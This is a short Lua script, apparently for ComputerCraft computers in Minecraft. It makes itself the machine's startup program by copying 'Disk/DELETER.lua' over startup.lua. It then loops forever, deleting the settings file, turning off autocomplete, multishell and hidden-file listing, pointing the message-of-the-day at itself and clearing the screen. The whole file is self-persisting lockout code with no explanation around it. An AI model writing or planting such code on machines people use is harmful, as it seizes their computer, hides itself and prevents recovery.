fs.delete("startup.lua")
fs.copy("Disk/DELETER.lua", "startup.lua")
local cycle = 0
while true do
 for y = 1, 10 do
  if cycle > 9 then
   term.clear()
   term.setCursorPos(1,1)
   term.clear()
   term.setCursorPos(0,0)
  end
  term.setCursorPos(0,0)
  fs.delete(".settings")
  shell.run("set", "bios.strict_globals", "false")
  shell.run("set", "bios.use_multishell", "false")
  shell.run("set", "edit.autocomplete", "false")
  shell.run("set", "edit.default_extension", "null")
  shell.run("set", "list.show_hidden", "false")
  shell.run("set", "lua.autocomplete", "false")
  shell.run("set", "lua.function_args", "false")
  shell.run("set", "lua.function_source", "false")
  shell.run("set", "lua.warn_against_use_of_local", "false")
  shell.run("set", "motd.enable", "false")
  shell.run("set", "motd.path", "Disk/DELETER.lua") 
  shell.run("set", "paint.default_extension", "null")
  shell.run("set", "shell.autocomplete", "false")
  shell.run("set", "shell.autocomplete_hidden", "false")
  term.clear()
  cycle = cycle + 1
 end
end
